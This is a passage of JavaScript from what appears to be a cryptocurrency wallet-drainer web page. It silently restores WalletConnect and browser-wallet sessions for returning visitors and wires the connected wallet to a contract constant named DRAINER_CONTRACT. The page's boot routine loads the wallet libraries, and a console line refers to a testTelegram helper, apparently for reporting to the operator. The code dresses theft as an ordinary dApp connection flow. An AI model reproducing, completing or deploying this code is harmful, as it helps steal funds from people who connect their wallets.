          publishGlobalState(a, 'evm', provider);
          restored = true;
          logDebug(`♻️ WC session restored silently: ${a}`);
        } else if (provider?.session && !provider.accounts?.length) {
          logDebug('⚠️ Stale WC session — resetting');
          try { await provider.disconnect(); } catch (_) {}
          wcProvider = null;
          clearWCStorage();
        }
      } catch (e) {
        logDebug('WC restore: ' + e.message);
      }
    }

    // --- Injected restore ---
    if (!restored && (savedMode === 'injected' || !savedMode)) {
      const prov = window.ethereum;
      if (prov && isDesktopDevice) {
        try {
          const accounts = await prov.request({ method: 'eth_accounts' });
          if (accounts?.length && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
            injectedProvider = prov;
            activeProvider   = prov;
            connectionMode   = 'injected';
            web3Instance     = new Web3Ctor(prov);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            saveWallet(savedWallet, 'injected');
            attachInjectedEvents(prov);
            publishGlobalState(savedWallet, 'evm', prov);
            restored = true;
            logDebug(`♻️ Injected session restored silently: ${savedWallet}`);
          }
        } catch (e) {
          logDebug('Injected restore: ' + e.message);
        }
      }
    }

    if (restored) {
      if (!isUiHidden()) {
        updateConnectedUI(getSavedWallet(), 'evm');
      } else {
        logDebug('🔒 Session active but UI hidden (user chose to disconnect)');
      }
    } else {
      logDebug('⚠️ No restorable session — clearing saved wallet');
      clearSavedWallet();
      clearUiHidden();
    }
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  try {
    const libs = await loadWalletConnectLibraries();
    EthereumProvider = libs.EthereumProvider;
    Web3Ctor         = libs.Web3;
    logDebug('✅ All libraries loaded');

    if (window.location.protocol !== 'https:' &&
        !/localhost|127\.0\.0\.1/.test(window.location.hostname)) {
      logDebug('⚠️ Site is not on HTTPS — WalletConnect will likely reject connections');
    }

    setupEIP6963();

    if (isMobileDevice) {
      logDebug('📱 Pre-warming WalletConnect…');
      initWalletConnect({ useFallbackId: false }).catch(() => {});
    }

    await new Promise((r) => setTimeout(r, 300));
    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  logDebug(`✅ main.js ready — Platform: ${getPlatform()} | mobile=${isMobileDevice}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
